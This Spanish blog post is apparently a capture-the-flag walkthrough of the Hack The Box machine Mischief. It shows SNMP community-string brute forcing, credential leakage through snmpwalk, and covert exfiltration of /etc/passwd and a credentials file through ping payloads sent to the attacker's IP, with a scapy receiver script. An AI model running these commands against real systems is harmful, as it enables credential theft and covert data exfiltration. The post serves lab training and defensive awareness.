---
title: Exfiltrando información por SNMP, IPv6 e ICMP
description: A través de protocolos como SNMP, IPv6 e ICMP estaremos exfiltrando información.
date: 2024-12-01
categories: [exfiltracion, snmp, ipv6, icmp]
tags: [data-exfiltration, community-string, onesixtyone, snmpwalk, mibs, python3, scripting, rce, ping, hexadecimal]
img_path: /assets/img/exfiltrando-informacion-por-snmp-ipv6-e-icmp.png
image: /assets/img/exfiltrando-informacion-por-snmp-ipv6-e-icmp.png
---

## **Introducción**

El **Protocolo Simple de Administración de Red (SNMP)** es ampliamente utilizado para gestionar y monitorear dispositivos en una red, pero también puede ser explotado como un vector para la **exfiltración de información** si no se asegura adecuadamente. A través de SNMP, un atacante puede obtener acceso a datos sensibles que están siendo gestionados en dispositivos de red, como routers, servidores y otros equipos.

Como *IPv6* no está tan ampliamente utilizado como *IPv4*, muchas veces los administradores de la red se olvidan de configurar reglas a través de *IPv6* por lo que un atacante que obtenga acceso a la red puede intentar establecer una **comunicación directa** con un dispositivo vulnerable a través de su dirección IPv6, eludiendo mecanismos de seguridad que protegen las direcciones IPv4.

Nadie se esperaba (incluido yo), que a través de simples trazas *ICMP* a través de comandos como `ping` se pudiera exfiltrar información, pero si, es posible.

## **Contexto**

Nos podemos encontrar casos en lo que no encontramos nada de lo que aprovecharnos por *IPv4*. Incluso puede llegar a pasar, que el tráfico *IPv4* está bloqueado y únicamente nos podemos comunicar por *IPv6*. Es por ello, que debemos tener en cuenta el descubrimiento y reconocimiento por *IPv6*. En este artículo, vamos a estar viendo como podemos llegar a exfiltrar información a través de *SNMP* por *IPv6*.

Para poder llevar a cabo este artículo, he estado utilizando la máquina [Mischief](https://app.hackthebox.com/machines/Mischief) de [Hack The Box](https://app.hackthebox.com/) y me he apoyado sobre el vídeo [HackTheBox \| Mischief \[OSCP Style\] \(TWITCH LIVE\)](https://www.youtube.com/watch?v=Q6vlt9BlnWg) de [S4vitar](https://www.youtube.com/@S4viOnLive).

## **Manos a la obra**

### **Reconocimiento**

Si realizamos el típico reconocimiento de puertos por *IPv4* sobre la máquina nos encontraremos con los siguientes puertos abiertos.

```bash
sudo nmap -p- --open --min-rate 5000 -sCV -Pn -n -vvv 10.10.10.92 -oN targeted
```

![puertos-abiertos-mischief.png](/assets/img/puertos-abiertos-mischief.png)

Desde el puerto *22* poco podemos hacer de momento y, por el puerto *3366* tampoco podremos hacer gran cosa, ya que nos piden credenciales con las cuales no contamos.

Cuando no encontramos ninguna vía de ataque a través de **TCP** podemos cambiar el escaneo para encontrar puertos interesantes por **UDP**.

```bash
sudo nmap -sU -top-ports 5000 -v -n 10.10.10.92 -oN targetedUdp
```

![puerto de snmp descubierto por udp.png](/assets/img/puerto-de-snmp-descubierto-por-udp.png)

El protocolo de *SNMP* por lo general, suele estar corriendo bajo *UDP* y no por *TCP* por lo que, siempre es una buena opción escanear la máquina por **UDP** por si encontramos algún puerto interesante como este.

### **Exfiltrando información por SNMP**

Teniendo en cuenta que el protocolo de *ICMP* está abierto, podemos intentar ver si se filtra información a través de este.

Para poder realizar búsquedas por este protocolo, tenemos la herramienta `snmpwalk` la cual, dos de los parámetros que nos pide son:

- `-v` (*versión*) ➜ Podemos ir probando por las diferentes versiones disponibles (*1*, *2c* y *3*).
- `-c` (*Community String*) ➜ Indispensable para conectarnos por *SNMP*.

Esta última (*community string*) es importante, ya que sin ella no podremos conectarnos a *SNMP* y por consecuencia, no filtrar ninguna información. Para descubrirla, contamos con la herramienta `onesixtyone` con la que podremos realizar fuerza bruta contra esta *community string* e incluso llegar a descubrirla. Además, si tenemos la lista de diccionarios que nos proporciona [SecList](https://github.com/danielmiessler/SecLists) tendremos el diccionario `common-snmp-community-strings.txt`.

Teniendo todo esto en nuestra posesión, realizaremos la fuerza bruta para encontrar la correspondiente *community string* configurada en *SNMP*.

```bash
onesixtyone 10.10.10.92 -c /usr/share/wordlists/seclists/Discovery/SNMP/common-snmp-community-strings.txt
```

![onesixtyone fuerza bruta.png](/assets/img/onesixtyone-fuerza-bruta.png)

Encontramos que, la *community string* que está configurada en *SNMP* es `public`. Ahora si, habiendo conocido esta información podremos llevar a cabo la exfiltration.

Con el comando `snmpwalk` le indicaremos la versión junto con la *community string* hallada anteriormente.

```bash
snmpwalk -v2c -c public 10.10.10.92
```

Si lo ejecutamos así, el resultado que nos muestra no es el mejor debido a que el principio de cada uno de ellos, nos indica la *ISO* a la que corresponde y lo que está mostrando no es muy representativo.

![snmpwalk con las iso mostrandose.png](/assets/img/snmpwalk-con-las-iso-mostrandose.png)

Si queremos que nos lo muestre de una manera en la cual, nos de más información de aquello en lo que nos está mostrando, podemos instalar `snmp-mibs-downloader`.

```bash
sudo apt install snmp-mibs-downloader
```

Después, editaremos el fichero `/etc/snmp/snmp.conf` para comentar la siguiente línea.

```bash
#mibs :
```

El fichero debería de quedar de la manera en la que se muestra en la imagen de a continuación.

![contenido del fichero snmp-conf.png](/assets/img/contenido-del-fichero-snmp-conf.png)

Gracias a esto y la instalación de `snmp-mibs-downloader` conseguiremos que el resultado sea el siguiente.

![resultado de snmpwalk una vez instalado mibs downloader.png](/assets/img/resultado-de-snmpwalk-una-vez-instalado-mibs-downloader.png)

#### **Exfiltrando la dirección IPv6**

A continuación, se indicarán algunos de los filtros más usados para exfiltrar información a través de este protocolo usando `snmpwalk`.  Con el parámetro `ipAddressType` podemos obtener la dirección *IPv4* e *IPv6* de la máquina víctima.

```bash
snmpwalk -v2c -c public 10.10.10.92 ipAddressType
```

![ipv6 encontrada.png](/assets/img/ipv6-encontrada.png)

Obtener la dirección *IPv6* es interesante debido a que ahora, seríamos capaz de realizar un escaneo a través de esta *IPv6* y, en caso de que las reglas definidas estén restringiendo el acceso por *IPv4* y no por *IPv6* seríamos capaz de encontrar alguna vía de explotación interesante.

```bash
sudo nmap -p- --open --min-rate 5000 -sCV -Pn -n -vvv -6 dead:beef::250:56ff:fe94:7d86 targetedipv6
```

![escaneo por ipv6 1.png](/assets/img/escaneo-por-ipv6-1.png)

Nos encontramos que con esta dirección IP están los puertos *22* y *80* abiertos los cuales, por *IPv4* no se encontraban. Ahora nos podríamos dirigir al navegador y buscar la web por esta dirección *IPv6*.

![entrando por el puerto 80 en el navegador por eipv6.png](/assets/img/entrando-por-el-puerto-80-en-el-navegador-por-eipv6.png)

Incluso, tenemos la posibilidad de editar nuestro fichero `/etc/hosts` y en vez de entrar a la web por *IPv6*, asignarle un nombre de dominio y entrar con el dominio indicado (por ejemplo, `mischief.htb`).

```bash
dead:beef::250:56ff:fe94:7d86   mischief.htb
```

Ahora si accedemos al dominio, nos mostrará la misma información que antes pero, en vez de poner la *IPv6* nos facilitaremos un poco la tarea sustituyéndolo por el dominio.

![accediendo a la web por dominio en vez de por ipv6.png](/assets/img/accediendo-a-la-web-por-dominio-en-vez-de-por-ipv6.png)

Gracias a que hemos podido exfiltrar la dirección *IPv6* de la máquina víctima a través de *SNMP* hemos conseguido acceder a un panel en el cual, no podríamos haber podido entrar por *IPv4*.

#### **Información acerca del sistema y el nombre de la máquina**

Otro parámetro interesante es el `sysDescr` con el que mostrará información acerca del sistema.

```bash
snmpwalk -v2c -c public 10.10.10.92 sysDescr
```

![parametro sysDescr snmwalk.png](/assets/img/parametro-sysDescr-snmwalk.png)

O `sysName` que nos muestra el nombre de la máquina.

```bash
snmpwalk -v2c -c public 10.10.10.92 sysName
```

![accediendo a la ipv6 por dominio.png](/assets/img/accediendo-a-la-ipv6-por-dominio.png)

#### **Información de las interfaces**

Antes mostramos las direcciones *IPv4* e *IPv6* que tenía la máquina pero, también podemos mostrar una descripción de cada interfaz.

```bash
snmpwalk -v2c -c public 10.10.10.92 ifDescr
```

![snmpwalk informacion de cada interfaz.png](/assets/img/snmpwalk-informacion-de-cada-interfaz.png)

También, podemos mostrar la tabla *ARP* de la máquina e incluso que direcciones *MAC* corresponde con cada dirección *IP*.

```bash
snmpwalk -v2c -c public 10.10.10.92 ipNetToMediaPhysAddress # Asigna direcciones IP con MAC
snmpwalk -v2c -c public 10.10.10.92 ipNetToMediaNetAddress # Muestra la tabla ARP
```

![snmpwalk ip con mac y tabla arp.png](/assets/img/snmpwalk-ip-con-mac-y-tabla-arp.png)

#### **Filtrando información a través de los procesos**

Nos daremos cuenta que la página web que se encuentra en el puerto *3366* por *IPv4* está montado en *Python* y sabemos que, existen comandos como `python3 -m http.server PUERTO` o `python -m SimpleHTTPServer PUERTO` para montar servidores a través de `python`.

```bash
whatweb http://10.10.10.92:3366
```

![whatweb para ver que esta montado en python.png](/assets/img/whatweb-para-ver-que-esta-montado-en-python.png)

Si el servidor estuviera montado de esta manera, puede que a la hora de levantarlo indicara las credenciales que vemos que nos piden. Entonces, para ver los procesos que hay en ejecución tenemos el parámetro `hrSWRunName` y como el que nos interesa es el de *python* filtraremos por el con `grep`.

```bash
snmpwalk -v2c -c public 10.10.10.92 hrSWRunName | grep -i "python"
```

![snmpwalk filtrando por el proceso de python.png](/assets/img/snmpwalk-filtrando-por-el-proceso-de-python.png)

Ahora que tenemos el número del proceso (*908*) buscaremos por información acerca de este.

```bash
snmpwalk -v2c -c public 10.10.10.92 hrSWRunTable | grep "908"
```

![filtrando informacion de un proceso y encontrando sus credenciales.png](/assets/img/filtrando-informacion-de-un-proceso-y-encontrando-sus-credenciales.png)

Podemos observar como hemos podido filtrar las credenciales del usuario *loki* a través de *SNMP*. Estas credenciales las probaremos en la web para ver si son correctas.

![acceso a la web por ipv4 por el puerto 3366.png](/assets/img/acceso-a-la-web-por-ipv4-por-el-puerto-3366.png)

Y efectivamente, eran las credenciales adecuadas. Gracias a esto vemos que hay otra credencial más que hemos logrado obtener. Estas, las probaremos en el panel de inicio de sesión de la web que descubrimos por *IPv6* contra diferentes usuarios.

![acceso a la web por ipv6 con las credenciales encontradas.png](/assets/img/acceso-a-la-web-por-ipv6-con-las-credenciales-encontradas.png)

Después de probar con las credenciales `administrator:trickeryanddeceit` conseguimos entrar.

### **Exfiltrando información por ICMP**

Aunque no lo creas, es posible exfiltrar información a través de un simple `ping` y vamos a demostrarlo.

Si nos fijamos en este panel, podemos enviar trazas *ICMP* a una dirección IP dada.

![panel en el que podemos enviar trazas icmp con ping.png](/assets/img/panel-en-el-que-podemos-enviar-trazas-icmp-con-ping.png)

Por ejemplo, si nos ponemos en escucha de trazas *ICMP* con `tcpdump` y modificamos el comando para que en vez de apuntar a la *loopback*, apunte a nuestra IP veremos como recibimos estas trazas.

```bash
sudo tcpdump -i tun0 icmp -n
```

![trazas icmp recibidas.png](/assets/img/trazas-icmp-recibidas.png)

Que se nos permita realizar esto ya es bastante grave, sin embargo, más grave sería el poder exfiltrar información debido a esto, y es lo que vamos a intentar.

El comando `ping` nos permite con el parámetro `-p` enviar un patrón en formato hexadecimal a través del envío de la traza *ICMP*. Teniendo esto en cuenta, vamos a realizar algunas pruebas antes de ponernos con la máquina víctima.

Para mostrar el contenido de un fichero en formato *hexadecimal* tenemos el comando `xxd`.

```bash
xxd -p -c 4 /etc/hosts
```

Con este comando, lo que conseguimos es que veamos la información del fichero `/etc/hosts` en partes de 4 octetos.

Si nosotros, iteramos por cada línea con `while read line; do echo "Octeto: $line"; done` lograremos ver lo siguiente para cada línea.

```bash
xxd -p -c 4 /etc/hosts | while read line; do echo "Octeto: $line"; done
```

![iterando por cada linea y mostrandolo con echo.png](/assets/img/iterando-por-cada-linea-y-mostrandolo-con-echo.png)

Sabiendo lo comentado anteriormente, en vez de mostrarlo con `echo` podemos mandarlo a través de un `ping`.

```bash
xxd -p -c 4 /etc/hosts | while read line; do ping -c 1 -p $line 127.0.0.1; done
```

![enviando contenido en hexadecimal del etc hosts por ping.png](/assets/img/enviando-contenido-en-hexadecimal-del-etc-hosts-por-ping.png)

Lo que tenemos con esto es, una manera de enviar información del contenido de el fichero indicado a través de `ping`. Lo que pasa es que esta información hay que tratarla, y para ello nos crearemos un script en *Python3* que realice este tratamiento y nos muestre la información en un formato legible.

Para saber el formato en el que lo debemos de mostrar, realizaremos pruebas haciendo uso de un fichero `Captura.cap` desde el cual tenemos las trazas *ICMP* con el contenido en hexadecimal.

```bash
sudo tcpdump -i tun0 icmp -n -v -w Captura.cap
```

Una vez en escucha, volveremos a enviar la información a través de *ICMP* con `ping` y veremos como recibimos todos estos paquetes.

![paquetes recibidos por tcpdump y guardados en captura-cap.png](/assets/img/paquetes-recibidos-por-tcpdump-y-guardados-en-captura-cap.png)

Sobre esto, estaremos realizando los filtros y búsquedas necesarios para mostrar la información que nos interesa en un formato adecuado.

Desde el *Python3* en modo interactivo, importaremos *scapy* quien nos facilitará toda esta búsqueda.

```python
from scapy.all import *
```

Después, leeremos la captura en formato `.cap` y lo almacenaremos en la variable `packets`.

```python
packets = rdpcap("Captura.cap")
```

Si ahora mostramos lo que vale `packets` observaremos que contiene *84* paquetes de los cuales, todos son *ICMP*.

![mostrando paquetes de captura-cap.png](/assets/img/mostrando-paquetes-de-captura-cap.png)

Para ver el contenido de estos paquetes, podemos iterar por cada uno de ellos y mostrarlos, sin embargo, se nos representará en un formato inadecuado.

```python
for packet in packets:
	print(packet)
```

En vez imprimir directamente el contenido de `packets` imprimimos el primer paquete, únicamente se nos mostrará el contenido del primer paquete.

```python
packets[0]
```

![imprimiendo el contenido del primer paquete.png](/assets/img/imprimiendo-el-contenido-del-primer-paquete.png)

Este paquete está dividido en capas y podemos ir mostrándolas individualmente. La capa que nos interesa es la de *ICMP* así que esta será la que mostremos.

```python
packets[0][ICMP]
```

![mostrando capa icmp del primer paquete.png](/assets/img/mostrando-capa-icmp-del-primer-paquete.png)

Esto nos permitirá acotar un poco más la búsqueda que queremos realizar. Además, si queremos ver los atributos de los cuales podemos filtrar, podemos realizar lo siguiente.

```python
ls(packets[0][ICMP])
```

![mostrando los atributos de los cuales podemos filtrar del paquete.png](/assets/img/mostrando-los-atributos-de-los-cuales-podemos-filtrar-del-paquete.png)

El campo que nos interesa es `load`, ya que es en este desde el cual podemos obtener la información del patrón enviado.

![campo load del primer paquete icmp.png](/assets/img/campo-load-del-primer-paquete-icmp.png)

Es en estos últimos 4 caracteres los cuales nos tenemos que quedar ya que, es aqui donde reside los datos enviada por *ICMP*.

![quedandonos con los ultimos 4 caracteres del paquete icmp.png](/assets/img/quedandonos-con-los-ultimos-4-caracteres-del-paquete-icmp.png)

Y si usamos `haslayer` para detectar si el paquete es *ICMP*, tendríamos una forma de filtrar por el paquete que nos interesa.

```python
packets[0].haslayer(ICMP)
```

![mostrando si el paquete es icmp.png](/assets/img/mostrando-si-el-paquete-es-icmp.png)

De esta manera, ya tenemos una forma con la que mostrar la información que filtramos en el formato adecuado.

Antes de empezar a crearemos el script, tenemos que tener una última cosa en cuenta. Si mostramos el tipo del paquete en el primero de ellos, veremos que nos sale el valor *8*.

```python
packets[0][ICMP].type
```

![mostrando el tipo del paquete.png](/assets/img/mostrando-el-tipo-del-paquete.png)

Sin embargo, al mostrar el tipo del siguiente paquete, observaremos que esta vez es *0*.

![mostrando el tipo de paquete para el segundo paquete.png](/assets/img/mostrando-el-tipo-de-paquete-para-el-segundo-paquete.png)

Si realizamos unas cuantas veces esto para los siguientes paquetes, nos percataremos que son los paquetes pares los que son de tipo *8*. 

Los paquetes de tipo *8* hacen referencia a que son paquete *Echo Request* y los de tipo *0* son *Echo Reply*. En el momento en el que enviamos una traza *ICMP*, no solo estaremos enviándola nosotros si no que, la propia máquina a la que estaremos enviando la traza, en caso de estar activa, nos responderá con el mismo tipo de traza es decir que, si nosotros enviamos un `ping` con el patrón correspondiente, la máquina destino, nos responderá con ese mismo patrón. Para evitar que nos represente la misma información dos veces, nos quedaremos con los paquetes de tipo *8*.

Ahora si, empezaremos con la creación del script.

```python
#!/usr/bin/env python3

# Liberías
from scapy.all import *

# Función que llamará el sniffer cada vez que entre un paquete
def filter_data(packet):
	print(packet) # Mostrando el paquete

# Función Main
if __name__ == '__main__':
	sniff(iface="tun0", prn=filter_data) # Creando el sniffer
```

Con este pequeño código, lo que estamos haciendo simplemente es mostrar el contenido de cada paquete. Con `sniff` estaremos definiendo un *sniffer* el cual, esté *sniffeando* por la interfaz `tun0` (que corresponde a la de la *VPN* de *HackTheBox*) y con `prn` le indicaremos la función que queremos llamar por cada paquete entrante. Dentro de la función `filter_data` estaremos definiendo las acciones que se realizarán por cada paquete que entre. En este momento, lo único que hace es mostrar el contenido del paquete.

Lo primero que haremos es, comprobar que el paquete realmente es una traza *ICMP* con `haslayer`.

```python
# Función que llamará el sniffer cada vez que entre un paquete
def filter_data(packet):
    if packet.haslayer(ICMP): # Nos quedamos con los paquetes ICMP
```

Después, con `type` nos quedaremos con los paquetes que sean de tipo *8* (*Echo Request*) para evitar mostrarse información duplicada (aunque nos podríamos quedar con cualquiera de los dos y funcionaría perfectamente).

```python
if packet[ICMP].type == 8: # Nos quedamos con los paquetes de tipo 9 (Echo Request)
```

Y por último debemos de mostrar el campo `load` del paquete. Después, decodificarlo en formato *UTF-8* para que no se nos muestre en formato `bytes` y, para que se nos represente tal cual a como se ve en el fichero tenemos que añadir la instrucción `flush=True` para decirle a *python* que escriba inmediatamente después de recibir la información y que no espere (evitaremos espacios en blanco) y `end=''` para que no se nos muestre ningún carácter diferente después de la salida.

Finalmente, debemos extraer los últimos cuatro octetos del campo _load_ del paquete y decodificarlos utilizando el formato UTF-8. Esto nos permite visualizarlo como texto en lugar de en formato `bytes`.  Para garantizar que la salida se represente exactamente como aparece en el archivo, utilizamos las siguientes configuraciones:

- `flush=True`: Indica a Python que escriba la salida de inmediato, sin esperar a llenar un buffer, lo que también evita espacios en blanco innecesarios.
- `end=''`: Evita que se añadan caracteres adicionales, como un salto de línea, al final de la salida.

```python
print(packet[ICMP].load[-4:].decode("utf-8"), flush=True, end='')
```

El código final quedaría de la manera que se indica a continuación.

```python
#!/usr/bin/env python3

# Liberías
from scapy.all import *

# Función que llamará el sniffer cada vez que entre un paquete
def filter_data(packet):
    if packet.haslayer(ICMP):
        if packet[ICMP].type == 8:
            print(packet[ICMP].load[-4:].decode("utf-8"), flush=True, end='')
    
# Función Main
if __name__ == '__main__':
	sniff(iface="tun0", prn=filter_data) # Creando el sniffer
```

Con nuestro código ya finalizado, ejecutaremos el siguiente comando tal y como comentamos anteriormente y, conseguiremos exfiltrar el contenido del fichero `/etc/hosts` de la máquina.

```bash
xxd -p -c 4 /etc/hosts | while read line; do ping -c 1 -p $line NUESTRA_IP_HTB; done
```

![filtrando el contenido del etc hosts de la maquia victima.png](/assets/img/filtrando-el-contenido-del-etc-hosts-de-la-maquia-victima.png)

Podemos ir modificando el fichero a exfiltrar simplemente cambiando el nombre del fichero. Si queremos obtener el `/etc/passwd` ejecutaremos el comando de a continuación.

```bash
xxd -p -c 4 /etc/passwd | while read line; do ping -c 1 -p $line NUESTRA_IP_HTB; done
```

![exfiltrando el etc passwd.png](/assets/img/exfiltrando-el-etc-passwd.png)

Si nos fijamos en el texto de la web, nos está comentando que el usuario tiene un contenido en su directorio home llamado `credentials`.

![mensaje de la pagina que nos indica fichero credentials.png](/assets/img/mensaje-de-la-pagina-que-nos-indica-fichero-credentials.png)

Vamos a ver que contenido tiene.

```bash
xxd -p -c 4 /home/loki/cred* | while read line; do ping -c 1 -p $line NUESTRA_IP_HTB; done
```

![acceso a la maquian con la informacion exfiltrada por icmp.png](/assets/img/acceso-a-la-maquian-con-la-informacion-exfiltrada-por-icmp.png)

Ahora que poseemos las credenciales de *loki* podemos intentar conectarnos con este usuario a la máquina víctima por *SSH*.

![consiguiendo acceso a la maquia gracias a la exfiltración de información.png](/assets/img/consiguiendo-acceso-a-la-maquia-gracias-a-la-exfiltracion-de-informacion.png)

Gracias a que hemos conseguido exfiltrar información por *ICMP* logramos acceder a la máquina víctima y comprometer su seguridad.

## **Enlaces de referencia**
Los siguientes son recursos de utilidad que me ayudaron a realizar este artículo y, a aprender sobre ello.

- [Máquina Mischief HackTheBox](https://app.hackthebox.com/machines/Mischief)
- [Resolución de la Máquina Mischief - S4vitar](https://www.youtube.com/watch?v=Q6vlt9BlnWg)
- [Chat GPT](https://chatgpt.com/)

## **Conclusión y Despedida**

En este artículo hemos explorado detalladamente las vulnerabilidades y posibilidades que ofrece el protocolo *SNMP* en combinación con *IPv6* para la exfiltración de información. A través de una serie de ejemplos prácticos, hemos visto cómo un atacante puede aprovechar configuraciones descuidadas o protocolos menos monitorizados para obtener datos sensibles, ya sea mediante el descubrimiento de direcciones *IPv6* no protegidas, la identificación de procesos críticos o incluso mediante la exfiltración creativa utilizando *ICMP*.

Este análisis nos deja una lección clave: la seguridad en redes no puede permitirse lagunas, especialmente cuando se trata de protocolos y tecnologías que a menudo se pasan por alto. La capacidad de un atacante para exfiltrar información de maneras tan creativas como las mostradas destaca la importancia de la vigilancia continua y la actualización de prácticas de seguridad.

Espero que este contenido haya despertado nuevas perspectivas y te sirva como una herramienta clave para potenciar tu desarrollo técnico.
